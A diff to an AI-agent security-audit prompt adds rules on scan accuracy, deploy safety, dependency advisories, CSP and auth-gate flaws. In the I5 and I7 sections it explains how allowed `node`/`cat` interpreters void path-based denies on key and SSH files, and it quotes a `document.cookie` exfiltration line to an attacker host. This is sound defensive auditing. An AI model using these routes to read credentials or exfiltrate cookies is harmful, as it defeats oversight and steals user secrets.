@@ -9,6 +9,18 @@ Paste this into Claude Code inside a project directory (single-project mode) or 
 
 Scan this project and give me a full security audit and code analysis.
 
+**v7.5 additions (2026-08-01) — SCAN INTEGRITY RULES, from twelve owner audits of a full v7.5 cycle:**
+- New **SCAN INTEGRITY RULES** section (I1-I12), immediately before FLAG OUTPUT RULES. Every rule comes from a defect found in the SCAN, not in an app. Read it before STEP 1.
+- **I1 never bound severity on an inferred ABSENCE** — a scan lowered a finding because "no DELETE policy exists in any migration"; the live database had a permissive one, allowing cross-tenant deletion. Presence claims degrade gracefully; absence claims do not.
+- **I2 Accepted Risks must survive regeneration** — 212 accept/resolve decisions across 26 projects live INSIDE the regenerated block, surviving only if an agent remembers. Reproduce every row verbatim including scope notes; never emit an accepted category as active.
+- **I3 do not damage the repo you are scanning** — scan commits broke a live app's production deploys twice (~5.5 days) via a prettier-gated build, and `[skip ci]` hid it without preventing it. Run the repo's own gate before committing.
+- **I4 count root advisories, not affected packages**, and verify a patched release exists and is API-compatible before calling a fix available.
+- **I5 judge a deny list by effective strength** — an allowed interpreter (`node`, `cat`, `npx`) voids every path-based Bash deny.
+- **I6 strip comments before matching** — four owners reported `innerHTML` matched inside comments saying the code avoids it. A regex reading prose as structure is this scan's most common defect.
+- **I7 score a dimension N/A when the mechanism is absent** (cookie flags on token-auth apps); a CSP is not a compensating control for a JS-readable session cookie; "present but permissive" is not "absent."
+- **I8 skipped is not passed** · **I9 shared Postgres project is not a shared namespace** (a routine `DROP ... IF EXISTS` would have destroyed a sibling app's 76k-row audit table) · **I10 enumerate every instance and headline the severe half** · **I11 two new grep-able classes** (`auth-gate-fails-open-on-missing-config`, `auth-matcher-unanchored-exclusion`) · **I12 assorted owner corrections**.
+- 2 new categories. Version deliberately held at v7.5 — same working week, same release.
+
 **v7.5 fixes (2026-07-30) — severity must describe THIS app's exposure, not the advisory's headline:**
 - **Dependency CVE reachability tiers (BLOCKING).** `npm-cve-critical` / `npm-cve-high` are no longer flat P1. Severity is now assigned by reachability: **P1** reachable in the production tree, **P2** in the production tree but reachability disproven by cited evidence, **P3** dev/build-only (`npm audit --omit=dev` clean). Down-severities require named evidence and an escalation tripwire; an inconclusive trace uses the higher tier. See the rule in SECURITY FLAG RULES.
 - **Why:** the taxonomy said `npm-cve-high | P1` flatly, while actual portfolio practice was P3 for dev-only (8 instances), P2 for prod-but-unreachable (2), and P1 only for prod-and-reachable (3). The written rule and the practice disagreed, so agents split — on the 2026-07-30 cycle four projects down-severitied on reachability while fourteen applied P1 mechanically, and one emitted an `npm-cve-critical` **P1** whose own flag text read *"dev-only — never shipped."* Portfolio P1 rose ~9× from a rubric change rather than a posture change, burying the genuinely new findings and destroying cycle-over-cycle comparability.
@@ -1525,6 +1537,246 @@ STRUCTURE: PASS
 
 ---
 
+## SCAN INTEGRITY RULES (v7.5, 2026-08-01 — BLOCKING)
+
+Twelve project owners audited a full v7.5 cycle against their own code. Every rule below
+comes from a defect they found in the SCAN, not in their apps. Several describe ways this
+scan made a finding look *safer* than it was, damaged a repo, or destroyed its own record.
+Read this section before STEP 1.
+
+### I1. NEVER bound severity on an ABSENCE you inferred from the repo
+
+**Presence claims degrade gracefully; absence claims do not.**
+
+A scan wrote: *"there is no UPDATE and no DELETE policy on `storage.objects` anywhere in the
+31 migrations, so existing objects cannot be overwritten or removed"* — and used that to
+lower a finding from destructive to creation-only. A live `pg_policy` query returned a
+permissive `DELETE` policy present in **no migration**: any authenticated user could delete
+any other organization's files. The absence was inferred from migration files; the database
+had been changed through the Supabase dashboard, as most of these schemas were.
+
+- A finding's severity may **never** rest on a DB-side control *not existing* — policies,
+  grants, triggers, RLS, indexes — unless confirmed against the live catalog
+  (`pg_policy`, `pg_class.relrowsecurity`, `information_schema`).
+- Without a live probe, "no policy found in migrations" is **UNKNOWN**, never **ABSENT**.
+  Unknown takes the higher severity.
+- Absence claims about *source code* (no upload path, no `next/image` call, no API route)
+  are fine — the repo is the whole truth there. The rule is specifically about state that
+  lives in a running system.
+
+### I2. Accepted Risks must survive regeneration — they are decisions, not output
+
+`### Accepted Risks` and `### Resolved` sit INSIDE the `SCAN:AUTO` block in 26 of 29
+projects, so every scan rewrites them. Their survival depends on an agent remembering an
+instruction. **212 recorded accept/resolve decisions are one forgetful regeneration from
+vanishing**, and one of them is a scope note (`this acceptance does NOT cover xlsx`) that is
+the only thing keeping a reachable P1 from being absorbed into a blanket acceptance.
+
+- Before rewriting the block, **parse the existing Accepted Risks and Resolved tables and
+  reproduce every row verbatim**, including dates, scope notes and exclusions. Never
+  paraphrase, never merge two entries, never drop a scope qualifier.
+- If a prior accepted row names an EXCLUSION (`scoped to X only`, `does not cover Y`), that
+  exclusion is load-bearing. Carry the exact words.
+- **Cross-check before emitting Active Flags:** if a category appears in Accepted Risks, it
+  may not also be emitted as active. One project shipped a CLAUDE.md listing
+  `auth-weak-password-policy` under Active Flags with "Fix: raise the minimum to 12" while
+  Accepted Risks recorded the owner's decision to keep it at 6 — exactly how an accepted
+  decision gets quietly "fixed" later.
+- If a count in prose disagrees with the table beneath it, the **table** is authoritative.
+
+### I3. Do not damage the repo you are scanning
+
+The scan's own commits broke a live revenue-taking app's production deploys **twice**,
+leaving it unable to deploy for ~5.5 days while serving a stale build. Cause: the scan writes
+unpadded markdown tables into `CLAUDE.md`, and that repo's `prebuild` runs
+`prettier --check .` over markdown.
+
+- **Before committing any file you wrote, run the repo's own gate.** Detect
+  `prebuild` / `format:check` / `lint` in `package.json` and run it. If it fails because of
+  your file, fix your file (`prettier --write <file>`) and re-run. If it still fails, do not
+  commit.
+- **`[skip ci]` does not prevent a Vercel deploy.** It suppressed the notification while the
+  build failed anyway — hiding the breakage without preventing it. Never rely on it to mean
+  "no deploy." If a scan commit triggers a deploy, check the deploy result and report it.
+- **Keep table cells to a one-line summary.** Multi-thousand-character reachability prose in
+  a single markdown cell makes a formatting-only re-pad produce an enormous diff, which is
+  what turned a whitespace change into a production outage. Put the analysis in a prose
+  subsection below the table, keyed by flag id.
+- **Retire what you replace.** Do not append a second security section beside a stale one —
+  two contradicting sources of truth in the file the freshness checker maintains.
+
+### I4. Count root advisories, not affected packages; verify a fix exists
+
+`npm audit` reports one advisory once per affected package. A scan reported "12 HIGH" where
+`npm audit --omit=dev` returned **3**, and another reported 16 highs that all traced to a
+**single** advisory cascading through minimatch consumers.
+
+- Report **root advisory count** and say so. Package count is not advisory count.
+- **`fixAvailable: true` is a claim, not a fact.** Verify a patched release exists AND is
+  API-compatible before calling a fix actionable. `brace-expansion`'s only patched releases
+  changed the module's export shape and break `minimatch@3`; `npm audit fix` on one project
+  took it from 6 high to **20** high while fixing nothing.
+- Resolve version claims against the **installed tree** (`npm ls <pkg>`, nested included),
+  not the top-level range. `next@16.2.12` still nests its own vulnerable `sharp`/`postcss`.
+- Where a framework vendors a vulnerable transitive and npm's only "fix" is a six-major
+  downgrade, say **no forward fix exists** rather than recommending a bump that cannot work.
+
+### I5. Judge a deny list by its EFFECTIVE strength
+
+A scan called a 31-entry `permissions.deny` block "thorough" and named `Bash(curl:*)` as the
+egress hole. The same settings allowed `Bash(node:*)`, `Bash(npx:*)` and `Bash(cat:*)` — each
+arbitrary code execution or arbitrary file read — so all 19 path-based denies over `*.pem`,
+`*.key`, `id_rsa*`, `.aws/**`, `.ssh/**` were void. `node -e "fs.readFileSync(...)"` walks
+straight past them.
+
+- **Enumerate allowed interpreters and read utilities FIRST** (`node`, `python`, `npx`,
+  `deno`, `ruby`, `perl`, `powershell`, `sh`, `bash`, `cat`, `type`, `head`, `tail`).
+- Any interpreter allow-rule **voids every path-based Bash deny**. Report effective strength,
+  never the nominal entry count.
+- MCP tool denies are different and DO hold — there is no alternate interpreter for an MCP
+  tool call. Distinguish the two.
+
+### I6. Strip comments before matching source patterns
+
+Four independent owners reported the same false positive: `innerHTML` matched inside comments
+that documented the code's avoidance of it — *"no innerHTML"*, *"not innerHTML"*, *"never
+innerHTML/dangerouslySetInnerHTML"*. One dashboard rendered `xssVectors: 3` beside a scan that
+had flagged zero XSS sinks and moved the related accepted risk to Resolved.
+
+- Strip comment lines and string literals before counting `innerHTML` /
+  `dangerouslySetInnerHTML` / `eval` / `document.write`, or require an assignment / call
+  position. Report the count you can defend by reading the sink.
+- This generalizes: **a regex that reads prose as structure is the single most common defect
+  in this scan.** Other instances found the same week — flag-text line citations
+  (`actions.ts:116,125`) parsed as a 116,125-line file; a merge step treating a flag whose
+  text quotes `status: "fail"` as already-dispositioned, preserving it every run until 12
+  phantom flags accumulated; standards assertions matching a function NAME rather than
+  behavior. When a check greps, ask what prose could satisfy it.
+
+### I7. Score a dimension N/A when the mechanism is absent
+
+Three owners independently reported the cookie dimension as a false signal: their apps set no
+cookies. Firebase Auth persists to IndexedDB, Supabase SPAs to localStorage. Scoring
+`httpOnly ✗ / secure ✗` renders a permanent 1/3 on an app with no cookies to secure.
+
+- **Detect the auth mechanism before scoring the cookie dimension.** Bearer/token auth with
+  no app-set cookie → `N/A`, exactly as `sameSite` is already handled.
+- `@supabase/ssr` ships `httpOnly: false` in its defaults *by design* because the browser
+  client must read the session; closing it needs a server-side session exchange these apps
+  do not have. Treat as a library default, not a per-app defect.
+- **A CSP is NOT a compensating control for a JS-readable session cookie.** No shipped
+  browser has a directive that stops top-level navigation (`navigate-to` never left draft),
+  so `location = "https://attacker/?c=" + document.cookie` exfiltrates regardless of
+  `connect-src` / `form-action`. The only genuine compensating control is zero XSS sinks.
+- Same rule for CSP itself: **"present but permissive" is not "absent."** An app whose CSP
+  carries `'unsafe-inline'` because its bundler requires it must not grade identically to an
+  app serving no CSP at all.
+
+### I8. Skipped is not passed
+
+Two live public sites were recorded as `_Not deployed_` with STEP 1B skipped entirely, because
+their URL was a platform default appearing nowhere in the repo. Both answered HTTP 200 when
+probed. A check that silently did not run is indistinguishable, in the output, from a check
+that passed.
+
+- Follow the STEP 1B URL-extraction fallback before concluding "no URL."
+- When a check genuinely cannot run, record it as a **deferral with a reason**, never as an
+  absence and never as a strength. Headers *configured* in `next.config.ts` are not headers
+  *served*; say which you verified.
+
+### I9. Shared infrastructure is not a shared namespace
+
+Two projects nearly lost data to the same class. Acting on `missing-audit-log`, the obvious
+name `public.audit_log` **already existed with 76,076 rows belonging to a sibling app** in the
+same Supabase project; `CREATE TABLE IF NOT EXISTS` silently skipped it. A `DROP TABLE IF
+EXISTS` — an ordinary thing to write — would have destroyed another app's audit history.
+Separately, a repo's Supabase CLI was linked to an old project still shared by four other
+apps: a bare `supabase db push` would have deployed to the wrong database.
+
+- Before recommending a new table / function / trigger, say: **check whether the object name
+  is already taken in this project — a shared Postgres project is not a shared table.**
+  Recommend a per-app prefix (`fb_*`, `wc_*`, `nfs_*`).
+- Never recommend `DROP ... IF EXISTS` as migration boilerplate on a shared project.
+- Check `supabase/config.toml` / `.supabase/` for the linked project ref and flag a mismatch
+  against the project the app actually uses.
+- When auth settings are project-level (signup policy, password minimum, HIBP), state the
+  **blast radius in apps**, and verify how many schemas the project actually hosts rather
+  than trusting the docs.
+
+### I10. Enumerate every instance before reporting a pattern
+
+A `static-admin-bearer` finding named one sender of a credential header. A repo-wide grep
+found a second. Fixing only the named one would have left the credential on the wire and
+silently broken the other path.
+
+- When flagging a pattern (credential-as-bearer, unvalidated input, swallowed catch),
+  enumerate **every** occurrence, not the first hit.
+- **Headline the severe half.** One finding led with a timing-unsafe compare (low practical
+  risk) while burying an unbounded caller-chosen storage key (write-anywhere if the secret
+  leaks) in an escalation clause. Rank within a finding, not just across findings.
+- **Label surface by runtime.** One flag merged a Vercel serverless route and a separate VPS
+  service into "two endpoints"; they deploy and remediate independently.
+- When an unvalidated value feeds a parser, check what **else** that same value decides
+  downstream — one project's unverified `file.type` also chose the stored extension and
+  `contentType`, persisting a mislabelled file.
+
+### I11. Two new grep-able classes — check both every scan
+
+**`auth-gate-fails-open-on-missing-config` (P1 when the file is the sole auth boundary).**
+Found in two projects, both from the same "let it run before the keys exist" scaffolding:
+
+```js
+if (!url || !key) return NextResponse.next();   // Next middleware/proxy
+if (!process.env.X) return next();              // Express
+if (!config.auth) return true;                  // guard returning "allowed"
+```
+
+In any auth boundary (`middleware.ts`/`proxy.ts`, Express auth middleware, route guards),
+find early returns conditioned on missing env/config that return a **pass** value. One
+mistyped Vercel variable served an entire tool unauthenticated, silently, while working
+locally. Fix guidance: fail closed in production, gate the escape hatch on `NODE_ENV`.
+NOTE a verification helper returning `false` for "signature invalid" is fail-CLOSED and
+correct — do not flag it.
+
+**`auth-matcher-unanchored-exclusion` (P2; P1 if the matcher is the only auth boundary).**
+Negative-lookahead matcher entries lacking `$` or a `/` boundary are PREFIX matches:
+`favicon.ico` also excludes `/favicon.ico.bak`, and an unescaped dot makes `/faviconXico`
+match too. Latent while those paths 404 — load-bearing the moment a route shares the prefix.
+
+### I12. Other corrections owners asked to be carried forward
+
+- **`VITE_*` / `NEXT_PUBLIC_*` exposure is decided by BUNDLING, not env-var presence.** A var
+  set in the platform but referenced nowhere in source is never emitted into the bundle.
+  Grep the built output or the source references before flagging.
+- **React component inline styles are NOT a CSP dependency.** React sets styles through CSSOM
+  (`node.style[k] = v`), which CSP does not police. `style-src` governs *parsed* `<style>`
+  elements and HTML `style=""` attributes — i.e. HTML-string assembly reaching `innerHTML` /
+  `document.write`. Do not recommend refactoring a 12,000-line component to drop
+  `'unsafe-inline'`; the actual dependency is usually a few hundred lines in print/PDF builders.
+  The CSP flag and any file-size flag are independent.
+- **`formatting-inconsistency` on Windows: check whether the diff is line-endings-only.**
+  `core.autocrlf=true` with no `.gitattributes` makes prettier flag files whose content is
+  identical. One project carried this for 32 days while CI was green the entire time — and the
+  scan asserted "CI fails its own gate today," which was false. Never assert CI status without
+  checking it.
+- **Grep `tests/` and `**/__tests__/` before calling anything dead.** A "delete this unused
+  file" recommendation would have broken two Playwright specs that read it as a fixture. The
+  correct fix was to MOVE it out of the web-served directory.
+- **A plpgsql state write immediately followed by `raise exception` in the same function is
+  dead code** — the raise rolls back the write. Confirmed present in two apps' live function
+  bodies; the diagnostic fingerprint is a status that has never once been set.
+- **Enumerate claude.ai cloud connectors alongside `~/.claude.json` `mcpServers`.** Two
+  same-vendor MCP surfaces existed (`mcp__supabase__*` stdio and `mcp__claude_ai_Supabase__*`
+  connector) exposing overlapping destructive tools; only one was scanned.
+- **Baseline owner-authorized hooks by HASH, not existence** — so a modification is flagged
+  rather than the file's presence. A `PreToolUse` hook returning a permission decision is
+  exactly the file an attacker would want to edit.
+- **A behavior documented as intentional can still be a vulnerability** when the reason it was
+  intentional no longer holds. One fail-open auth gate was found by reading a CI comment that
+  described it as deliberate — true for local dev, never true for production.
+
+---
+
 ## FLAG OUTPUT RULES
 
 Every flag MUST be a structured object:
@@ -1710,6 +1962,8 @@ These are the valid category keys for flags. Every flag must use one of these:
 | npm-cve-critical | P1/P2/P3 | Critical CVE from npm audit — severity by REACHABILITY, see below |
 | npm-cve-high | P1/P2/P3 | High CVE from npm audit — severity by REACHABILITY, see below |
 | npm-cve-moderate | P4 | Moderate CVE from npm audit |
+| auth-gate-fails-open-on-missing-config | P1/P2 | Auth boundary returns a PASS value when its own env/config is missing (`if (!url||!key) return next()`); P1 when that file is the sole auth gate. Fail closed in production. (v7.5) |
+| auth-matcher-unanchored-exclusion | P2/P1 | Middleware/proxy matcher negative-lookahead entry lacking `$` or a `/` boundary, so it prefix-matches (`favicon.ico` also excludes `/favicon.ico.bak`); P1 if the matcher is the only auth boundary. (v7.5) |
 | repo-sync-skipped-dirty | P4 | Orchestrator-injected: local repo was dirty at scan time, ff-only sync skipped, so the scan read possibly-stale local code |
 | xss-innerhtml | P2 | innerHTML with user input |
 | xss-dangerously | P1 | dangerouslySetInnerHTML with user input |
